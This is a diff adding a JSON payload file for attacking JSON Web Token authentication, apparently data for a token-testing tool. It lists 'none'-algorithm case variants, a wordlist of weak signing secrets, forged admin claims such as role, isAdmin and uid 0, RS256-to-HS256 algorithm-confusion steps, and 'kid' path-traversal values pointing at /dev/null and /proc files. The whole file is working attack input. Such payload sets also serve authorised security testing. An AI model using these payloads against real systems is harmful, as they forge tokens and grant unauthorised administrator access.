@@ -1,0 +1,49 @@
+{
+  "none_algorithm": {
+    "description": "Set alg to 'none' and remove signature",
+    "variants": ["none", "None", "NONE", "nOnE", "noNe"]
+  },
+  "common_secrets": [
+    "secret", "password", "123456", "key", "admin",
+    "changeme", "secret123", "password123", "jwt_secret",
+    "supersecret", "mysecret", "s3cr3t", "letmein",
+    "default", "token", "test", "qwerty", "abc123",
+    "iloveyou", "welcome", "monkey", "dragon",
+    "master", "login", "princess", "football",
+    "shadow", "sunshine", "trustno1", "passw0rd",
+    "your-256-bit-secret", "ssh-secret",
+    "jwt-secret", "hmac-secret", "HS256-secret",
+    "my-secret-key", "my_secret_key",
+    "app_secret", "APP_SECRET", "JWT_KEY",
+    "node_secret", "flask_secret", "django_secret"
+  ],
+  "claim_manipulation": {
+    "admin_claims": [
+      {"role": "admin"},
+      {"role": "administrator"},
+      {"admin": true},
+      {"isAdmin": true},
+      {"is_admin": true},
+      {"user_type": "admin"},
+      {"access_level": "admin"},
+      {"privilege": "admin"},
+      {"group": "admin"},
+      {"permissions": ["admin"]},
+      {"sub": "admin"},
+      {"username": "admin"},
+      {"user": "admin"},
+      {"user_id": 1},
+      {"uid": 0}
+    ]
+  },
+  "algorithm_confusion": {
+    "rs256_to_hs256": "Change algorithm from RS256 to HS256 and sign with public key as HMAC secret",
+    "target_algorithms": ["HS256", "HS384", "HS512"]
+  },
+  "kid_injection": [
+    {"kid": "/dev/null", "secret": ""},
+    {"kid": "../../dev/null", "secret": ""},
+    {"kid": "/proc/sys/kernel/hostname", "secret": ""},
+    {"kid": "key.pem", "secret": ""}
+  ]
+}
